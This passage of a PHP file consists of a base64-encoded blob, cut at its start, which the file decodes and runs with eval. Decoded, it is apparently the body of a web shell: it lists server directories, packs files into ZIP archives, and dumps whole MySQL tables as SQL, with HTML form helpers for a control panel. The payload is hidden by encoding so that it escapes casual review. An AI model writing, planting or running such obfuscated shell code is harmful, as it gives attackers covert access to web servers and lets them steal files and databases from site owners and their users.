Ql3aGlsZSAoJGZpbGUgPSByZWFkZGlyKCRkaCkpIHsKCQkJCQlpZigkZmlsZSE9Jy4nICYmICRmaWxlIT0nLi4nKXsKCQkJCQkJJGY9JGRpciAuJy8nLiAkZmlsZTsKCQkJCQkJaWYoaXNfZGlyKCRmKSkgJHRoaXMtPkdldEZpbGVMaXN0KCRmKTsKCQkJCQkJJGFbXT0kZjsKCQkJCQl9CgkJCQl9CgkJCQljbG9zZWRpcigkZGgpOwoJCQl9CgkJfQoJCXJldHVybiAkYTsKCX0KCgl2YXIgJGRhdGFzZWMgICAgICA9IGFycmF5KCk7Cgl2YXIgJGN0cmxfZGlyICAgICA9IGFycmF5KCk7Cgl2YXIgJGVvZl9jdHJsX2RpciA9ICJceDUwXHg0Ylx4MDVceDA2XHgwMFx4MDBceDAwXHgwMCI7Cgl2YXIgJG9sZF9vZmZzZXQgICA9IDA7CgoJZnVuY3Rpb24gdW5peDJEb3NUaW1lKCR1bml4dGltZSA9IDApIHsKCQkkdGltZWFycmF5ID0gKCR1bml4dGltZSA9PSAwKSA/IGdldGRhdGUoKSA6IGdldGRhdGUoJHVuaXh0aW1lKTsKCQlpZiAoJHRpbWVhcnJheVsneWVhciddIDwgMTk4MCkgewoJCQkkdGltZWFycmF5Wyd5ZWFyJ10gICAgPSAxOTgwOwoJCQkkdGltZWFycmF5Wydtb24nXSAgICAgPSAxOwoJCQkkdGltZWFycmF5WydtZGF5J10gICAgPSAxOwoJCQkkdGltZWFycmF5Wydob3VycyddICAgPSAwOwoJCQkkdGltZWFycmF5WydtaW51dGVzJ10gPSAwOwoJCQkkdGltZWFycmF5WydzZWNvbmRzJ10gPSAwOwoJCX0gLy8gZW5kIGlmCgkJcmV0dXJuICgoJHRpbWVhcnJheVsneWVhciddIC0gMTk4MCkgPDwgMjUpIHwgKCR0aW1lYXJyYXlbJ21vbiddIDw8IDIxKSB8ICgkdGltZWFycmF5WydtZGF5J10gPDwgMTYpIHwKCQkJCSgkdGltZWFycmF5Wydob3VycyddIDw8IDExKSB8ICgkdGltZWFycmF5WydtaW51dGVzJ10gPDwgNSkgfCAoJHRpbWVhcnJheVsnc2Vjb25kcyddID4+IDEpOwoJfQoKCWZ1bmN0aW9uIGFkZEZpbGUoJGRhdGEsICRuYW1lLCAkdGltZSA9IDApIHsKCQkkbmFtZSA9IHN0cl9yZXBsYWNlKCdcXCcsICcvJywgJG5hbWUpOwoKCQkkZHRpbWUgPSBkZWNoZXgoJHRoaXMtPnVuaXgyRG9zVGltZSgkdGltZSkpOwoJCSRoZXhkdGltZQk9ICdceCcgLiAkZHRpbWVbNl0gLiAkZHRpbWVbN10KCQkJCQkuICdceCcgLiAkZHRpbWVbNF0gLiAkZHRpbWVbNV0KCQkJCQkuICdceCcgLiAkZHRpbWVbMl0gLiAkZHRpbWVbM10KCQkJCQkuICdceCcgLiAkZHRpbWVbMF0gLiAkZHRpbWVbMV07CgkJZXZhbCgnJGhleGR0aW1lID0gIicgLiAkaGV4ZHRpbWUgLiAnIjsnKTsKCQkkZnIJPSAiXHg1MFx4NGJceDAzXHgwNCI7CgkJJGZyCS49ICJceDE0XHgwMCI7CgkJJGZyCS49ICJceDAwXHgwMCI7CgkJJGZyCS49ICJceDA4XHgwMCI7CgkJJGZyCS49ICRoZXhkdGltZTsKCgkJJHVuY19sZW4gPSBzdHJsZW4oJGRhdGEpOwoJCSRjcmMgPSBjcmMzMigkZGF0YSk7CgkJJHpkYXRhID0gZ3pjb21wcmVzcygkZGF0YSk7CgkJJGNfbGVuID0gc3RybGVuKCR6ZGF0YSk7CgkJJHpkYXRhID0gc3Vic3RyKHN1YnN0cigkemRhdGEsIDAsIHN0cmxlbigkemRhdGEpIC0gNCksIDIpOwoJCSRmciAuPSBwYWNrKCdWJywgJGNyYyk7CgkJJGZyIC49IHBhY2soJ1YnLCAkY19sZW4pOwoJCSRmciAuPSBwYWNrKCdWJywgJHVuY19sZW4pOwoJCSRmciAuPSBwYWNrKCd2Jywgc3RybGVuKCRuYW1lKSk7CgkJJGZyIC49IHBhY2soJ3YnLCAwKTsKCQkkZnIgLj0gJG5hbWU7CgkJJGZyIC49ICR6ZGF0YTsKCQkkZnIgLj0gcGFjaygnVicsICRjcmMpOwoJCSRmciAuPSBwYWNrKCdWJywgJGNfbGVuKTsKCQkkZnIgLj0gcGFjaygnVicsICR1bmNfbGVuKTsKCgkJJHRoaXMgLT4gZGF0YXNlY1tdID0gJGZyOwoJCSRuZXdfb2Zmc2V0ID0gc3RybGVuKGltcGxvZGUoJycsICR0aGlzLT5kYXRhc2VjKSk7CgoJCSRjZHJlYyA9ICJceDUwXHg0Ylx4MDFceDAyIjsKCQkkY2RyZWMgLj0gIlx4MDBceDAwIjsKCQkkY2RyZWMgLj0gIlx4MTRceDAwIjsKCQkkY2RyZWMgLj0gIlx4MDBceDAwIjsKCQkkY2RyZWMgLj0gIlx4MDhceDAwIjsKCQkkY2RyZWMgLj0gJGhleGR0aW1lOwoJCSRjZHJlYyAuPSBwYWNrKCdWJywgJGNyYyk7CgkJJGNkcmVjIC49IHBhY2soJ1YnLCAkY19sZW4pOwoJCSRjZHJlYyAuPSBwYWNrKCdWJywgJHVuY19sZW4pOwoJCSRjZHJlYyAuPSBwYWNrKCd2Jywgc3RybGVuKCRuYW1lKSApOwoJCSRjZHJlYyAuPSBwYWNrKCd2JywgMCApOwoJCSRjZHJlYyAuPSBwYWNrKCd2JywgMCApOwoJCSRjZHJlYyAuPSBwYWNrKCd2JywgMCApOwoJCSRjZHJlYyAuPSBwYWNrKCd2JywgMCApOwoJCSRjZHJlYyAuPSBwYWNrKCdWJywgMzIgKTsKCQkkY2RyZWMgLj0gcGFjaygnVicsICR0aGlzIC0+IG9sZF9vZmZzZXQgKTsKCQkkdGhpcyAtPiBvbGRfb2Zmc2V0ID0gJG5ld19vZmZzZXQ7CgkJJGNkcmVjIC49ICRuYW1lOwoKCQkkdGhpcyAtPiBjdHJsX2RpcltdID0gJGNkcmVjOwoJfQoKCWZ1bmN0aW9uIGZpbGUoKSB7CgkJJGRhdGEgICAgPSBpbXBsb2RlKCcnLCAkdGhpcyAtPiBkYXRhc2VjKTsKCQkkY3RybGRpciA9IGltcGxvZGUoJycsICR0aGlzIC0+IGN0cmxfZGlyKTsKCQlyZXR1cm4gJGRhdGEgLiAkY3RybGRpciAuICR0aGlzIC0+IGVvZl9jdHJsX2RpciAuIHBhY2soJ3YnLCBzaXplb2YoJHRoaXMgLT4gY3RybF9kaXIpKSAuIHBhY2soJ3YnLCBzaXplb2YoJHRoaXMgLT4gY3RybF9kaXIpKSAuCXBhY2soJ1YnLCBzdHJsZW4oJGN0cmxkaXIpKSAuIHBhY2soJ1YnLCBzdHJsZW4oJGRhdGEpKSAuICJceDAwXHgwMCI7Cgl9Cn0KCi8vIER1bXAgbXlzcWwKZnVuY3Rpb24gc3FsZHVtcHRhYmxlKCR0YWJsZSwgJGZwPTApIHsKCSR0YWJsZWR1bXAgPSAiRFJPUCBUQUJMRSBJRiBFWElTVFMgJHRhYmxlO1xuIjsKCSR0YWJsZWR1bXAgLj0gIkNSRUFURSBUQUJMRSAkdGFibGUgKFxuIjsKCgkkZmlyc3RmaWVsZD0xOwoKCSRmaWVsZHMgPSBxKCJTSE9XIEZJRUxEUyBGUk9NICR0YWJsZSIpOwoJd2hpbGUgKCRmaWVsZCA9IG15c3FsX2ZldGNoX2FycmF5KCRmaWVsZHMpKSB7CgkJaWYgKCEkZmlyc3RmaWVsZCkgewoJCQkkdGFibGVkdW1wIC49ICIsXG4iOwoJCX0gZWxzZSB7CgkJCSRmaXJzdGZpZWxkPTA7CgkJfQoJCSR0YWJsZWR1bXAgLj0gIiAgICRmaWVsZFtGaWVsZF0gJGZpZWxkW1R5cGVdIjsKCQlpZiAoIWVtcHR5KCRmaWVsZFsiRGVmYXVsdCJdKSkgewoJCQkkdGFibGVkdW1wIC49ICIgREVGQVVMVCAnJGZpZWxkW0RlZmF1bHRdJyI7CgkJfQoJCWlmICgkZmllbGRbJ051bGwnXSAhPSAiWUVTIikgewoJCQkkdGFibGVkdW1wIC49ICIgTk9UIE5VTEwiOwoJCX0KCQlpZiAoJGZpZWxkWydFeHRyYSddICE9ICIiKSB7CgkJCSR0YWJsZWR1bXAgLj0gIiAkZmllbGRbRXh0cmFdIjsKCQl9Cgl9CglmcigkZmllbGRzKTsKCgkka2V5cyA9IHEoIlNIT1cgS0VZUyBGUk9NICR0YWJsZSIpOwoJd2hpbGUgKCRrZXkgPSBteXNxbF9mZXRjaF9hcnJheSgka2V5cykpIHsKCQkka25hbWU9JGtleVsnS2V5X25hbWUnXTsKCQlpZiAoJGtuYW1lICE9ICJQUklNQVJZIiAmJiAka2V5WydOb25fdW5pcXVlJ10gPT0gMCkgewoJCQkka25hbWU9IlVOSVFVRXwka25hbWUiOwoJCX0KCQlpZighaXNfYXJyYXkoJGluZGV4WyRrbmFtZV0pKSB7CgkJCSRpbmRleFska25hbWVdID0gYXJyYXkoKTsKCQl9CgkJJGluZGV4WyRrbmFtZV1bXSA9ICRrZXlbJ0NvbHVtbl9uYW1lJ107Cgl9Cglmcigka2V5cyk7CgoJd2hpbGUobGlzdCgka25hbWUsICRjb2x1bW5zKSA9IEBlYWNoKCRpbmRleCkpIHsKCQkkdGFibGVkdW1wIC49ICIsXG4iOwoJCSRjb2xuYW1lcz1pbXBsb2RlKCRjb2x1bW5zLCIsIik7CgoJCWlmICgka25hbWUgPT0gIlBSSU1BUlkiKSB7CgkJCSR0YWJsZWR1bXAgLj0gIiAgIFBSSU1BUlkgS0VZICgkY29sbmFtZXMpIjsKCQl9IGVsc2UgewoJCQlpZiAoc3Vic3RyKCRrbmFtZSwwLDYpID09ICJVTklRVUUiKSB7CgkJCQkka25hbWU9c3Vic3RyKCRrbmFtZSw3KTsKCQkJfQoJCQkkdGFibGVkdW1wIC49ICIgICBLRVkgJGtuYW1lICgkY29sbmFtZXMpIjsKCQl9Cgl9CgoJJHRhYmxlZHVtcCAuPSAiXG4pO1xuXG4iOwoJaWYgKCRmcCkgewoJCWZ3cml0ZSgkZnAsJHRhYmxlZHVtcCk7Cgl9IGVsc2UgewoJCWVjaG8gJHRhYmxlZHVtcDsKCX0KCgkkcm93cyA9IHEoIlNFTEVDVCAqIEZST00gJHRhYmxlIik7CgkkbnVtZmllbGRzID0gbXlzcWxfbnVtX2ZpZWxkcygkcm93cyk7Cgl3aGlsZSAoJHJvdyA9IG15c3FsX2ZldGNoX2FycmF5KCRyb3dzKSkgewoJCSR0YWJsZWR1bXAgPSAiSU5TRVJUIElOVE8gJHRhYmxlIFZBTFVFUygiOwoKCQkkZmllbGRjb3VudGVyPS0xOwoJCSRmaXJzdGZpZWxkPTE7CgkJd2hpbGUgKCsrJGZpZWxkY291bnRlcjwkbnVtZmllbGRzKSB7CgkJCWlmICghJGZpcnN0ZmllbGQpIHsKCQkJCSR0YWJsZWR1bXAuPSIsICI7CgkJCX0gZWxzZSB7CgkJCQkkZmlyc3RmaWVsZD0wOwoJCQl9CgoJCQlpZiAoIWlzc2V0KCRyb3dbJGZpZWxkY291bnRlcl0pKSB7CgkJCQkkdGFibGVkdW1wIC49ICJOVUxMIjsKCQkJfSBlbHNlIHsKCQkJCSR0YWJsZWR1bXAgLj0gIiciLm15c3FsX2VzY2FwZV9zdHJpbmcoJHJvd1skZmllbGRjb3VudGVyXSkuIiciOwoJCQl9CgkJfQoKCQkkdGFibGVkdW1wIC49ICIpO1xuIjsKCgkJaWYgKCRmcCkgewoJCQlmd3JpdGUoJGZwLCR0YWJsZWR1bXApOwoJCX0gZWxzZSB7CgkJCWVjaG8gJHRhYmxlZHVtcDsKCQl9Cgl9Cglmcigkcm93cyk7CglpZiAoJGZwKSB7CgkJZndyaXRlKCRmcCwiXG4iKTsKCX0gZWxzZSB7CgkJZWNobyAiXG4iOwoJfQp9CgpmdW5jdGlvbiB1ZSgkc3RyKXsKCXJldHVybiB1cmxlbmNvZGUoJHN0cik7Cn0KCmZ1bmN0aW9uIHAoJHN0cil7CgllY2hvICRzdHIuIlxuIjsKfQoKZnVuY3Rpb24gdGJoZWFkKCkgewoJcCgnPHRhYmxlIHdpZHRoPSIxMDAlIiBib3JkZXI9IjAiIGNlbGxwYWRkaW5nPSI0IiBjZWxsc3BhY2luZz0iMCI+Jyk7Cn0KZnVuY3Rpb24gdGJmb290KCl7CglwKCc8L3RhYmxlPicpOwp9CgpmdW5jdGlvbiBtYWtlaGlkZSgkbmFtZSwkdmFsdWU9JycpewoJcCgiPGlucHV0IGlkPVwiJG5hbWVcIiB0eXBlPVwiaGlkZGVuXCIgbmFtZT1cIiRuYW1lXCIgdmFsdWU9XCIkdmFsdWVcIiAvPiIpOwp9CgpmdW5jdGlvbiBtYWtlaW5wdXQoJGFyZyA9IGFycmF5KCkpewoJJGFyZ1snc2l6ZSddID0gJGFyZ1snc2l6ZSddID4gMCA/ICJzaXplPVwiJGFyZ1tzaXplXVwiIiA6ICJzaXplPVwiMTAwXCIiOwoJJGFyZ1snZXh0cmEnXSA9ICRhcmdbJ2V4dHJhJ10gPyAkYXJnWydleHRyYSddIDogJyc7CgkhJGFyZ1sndHlwZSddICYmICRhcmdbJ3R5cGUnXSA9ICd0ZXh0JzsKCSRhcmdbJ3RpdGxlJ10gPSAkYXJnWyd0aXRsZSddID8gJGFyZ1sndGl0bGUnXS4nPGJyIC8+JyA6ICcnOwoJJGFyZ1snY2xhc3MnXSA9ICRhcmdbJ2NsYXNzJ10gPyAkYXJnWydjbGFzcyddIDogJ2lucHV0JzsKCWlmICgkYXJnWyduZXdsaW5lJ10pIHsKCQlwKCI8cD4kYXJnW3RpdGxlXTxpbnB1dCBjbGFzcz1cIiRhcmdbY2xhc3NdXCIgbmFtZT1cIiRhcmdbbmFtZV1cIiBpZD1cIiRhcmdbbmFtZV1cIiB2YWx1ZT1cIiRhcmdbdmFsdWVdXCIgdHlwZT1cIiRhcmdbdHlwZV1cIiAkYXJnW3NpemVdICRhcmdbZXh0cmFdIC8+PC9wPiIpOwoJfSBlbHNlIHsKCQlwKCIkYXJnW3RpdGxlXTxpbnB1dCBjbGFzcz1cIiRhcmdbY2xhc3NdXCIgbmFtZT1cIiRhcmdbbmFtZV1cIiBpZD1cIiRhcmdbbmFtZV1cIiB2YWx1ZT1cIiRhcmdbdmFsdWVdXCIgdHlwZT1cIiRhcmdbdHlwZV1cIiAkYXJnW3NpemVdICRhcmdbZXh0cmFdIC8+Iik7Cgl9Cn0KCmZ1bmN0aW9uIG1ha2VzZWxlY3QoJGFyZyA9IGFycmF5KCkpewoJaWYgKCRhcmdbJ29uY2hhbmdlJ10pIHsKCQkkb25jaGFuZ2UgPSAnb25jaGFuZ2U9IicuJGFyZ1snb25jaGFuZ2UnXS4nIic7Cgl9CgkkYXJnWyd0aXRsZSddID0gJGFyZ1sndGl0bGUnXSA/ICRhcmdbJ3RpdGxlJ10gOiAnJzsKCWlmICgkYXJnWyduZXdsaW5lJ10pIHAoJzxwPicpOwoJcCgiJGFyZ1t0aXRsZV0gPHNlbGVjdCBjbGFzcz1cImlucHV0XCIgaWQ9XCIkYXJnW25hbWVdXCIgbmFtZT1cIiRhcmdbbmFtZV1cIiAkb25jaGFuZ2U+Iik7CgkJaWYgKGlzX2FycmF5KCRhcmdbJ29wdGlvbiddKSkgewoJCQlmb3JlYWNoICgkYXJnWydvcHRpb24nXSBhcyAka2V5PT4kdmFsdWUpIHsKCQkJCWlmICgkYXJnWydzZWxlY3RlZCddPT0ka2V5KSB7CgkJCQkJcCgiPG9wdGlvbiB2YWx1ZT1cIiRrZXlcIiBzZWxlY3RlZD4kdmFsdWU8L29wdGlvbj4iKTsKCQkJCX0gZWxzZSB7CgkJCQkJcCgiPG9wdGlvbiB2YWx1ZT1cIiRrZXlcIj4kdmFsdWU8L29wdGlvbj4iKTsKCQkJCX0KCQkJfQoJCX0KCXAoIjwvc2VsZWN0PiIpOwoJaWYgKCRhcmdbJ25ld2xpbmUnXSkgcCgnPC9wPicpOwp9CmZ1bmN0aW9uIGZvcm1oZWFkKCRhcmcgPSBhcnJheSgpKSB7CgkhJGFyZ1snbWV0aG9kJ10gJiYgJGFyZ1snbWV0aG9kJ10gPSAncG9zdCc7CgkhJGFyZ1snYWN0aW9uJ10gJiYgJGFyZ1snYWN0aW9uJ10gPSAkc2VsZjsKCSRhcmdbJ3RhcmdldCddID0gJGFyZ1sndGFyZ2V0J10gPyAidGFyZ2V0PVwiJGFyZ1t0YXJnZXRdXCIiIDogJyc7CgkhJGFyZ1snbmFtZSddICYmICRhcmdbJ25hbWUnXSA9ICdmb3JtMSc7CglwKCI8Zm9ybSBuYW1lPVwiJGFyZ1tuYW1lXVwiIGlkPVwiJGFyZ1tuYW1lXVwiIGFjdGlvbj1cIiRhcmdbYWN0aW9uXVwiIG1ldGhvZD1cIiRhcmdbbWV0aG9kXVwiICRhcmdbdGFyZ2V0XT4iKTsKCWlmICgkYXJnWyd0aXRsZSddKSB7CgkJcCgnPGgyPicuJGFyZ1sndGl0bGUnXS4nICZyYXF1bzs8L2gyPicpOwoJfQp9CgpmdW5jdGlvbiBtYWtldGV4dCgkYXJnID0gYXJyYXkoKSl7CgkhJGFyZ1snY29scyddICYmICRhcmdbJ2NvbHMnXSA9IDEwMDsKCSEkYXJnWydyb3dzJ10gJiYgJGFyZ1sncm93cyddID0gMjU7CgkkYXJnWyd0aXRsZSddID0gJGFyZ1sndGl0bGUnXSA/ICRhcmdbJ3RpdGxlJ10uJzxiciAvPicgOiAnJzsKCXAoIjxwPiRhcmdbdGl0bGVdPHRleHRhcmVhIGNsYXNzPVwiYXJlYVwiIGlkPVwiJGFyZ1tuYW1lXVwiIG5hbWU9XCIkYXJnW25hbWVdXCIgY29scz1cIiRhcmdbY29sc11cIiByb3dzPVwiJGFyZ1tyb3dzXVwiICRhcmdbZXh0cmFdPiRhcmdbdmFsdWVdPC90ZXh0YXJlYT48L3A+Iik7Cn0KCmZ1bmN0aW9uIGZvcm1mb290ZXIoJG5hbWUgPSAnJyl7CgkhJG5hbWUgJiYgJG5hbWUgPSAnc3VibWl0JzsKCXAoJzxwPjxpbnB1dCBjbGFzcz0iYnQiIG5hbWU9IicuJG5hbWUuJyIgaWQ9XCInLiRuYW1lLidcIiB0eXBlPSJzdWJtaXQiIHZhbHVlPSJTdWJtaXQiPjwvcD4nKTsKCXAoJzwvZm9ybT4nKTsKfQoKZnVuY3Rpb24gZm9ybWZvb3QoKXsKCXAoJzwvZm9ybT4nKTsKfQoKLy8gRXhpdApmdW5jdGlvbiBwcigkYSkgewoJZWNobyAnPHByZT4nOwoJcHJpbnRfcigkYSk7CgllY2hvICc8L3ByZT4nOwp9Cgo='; eval(base64_decode($a)); ?>
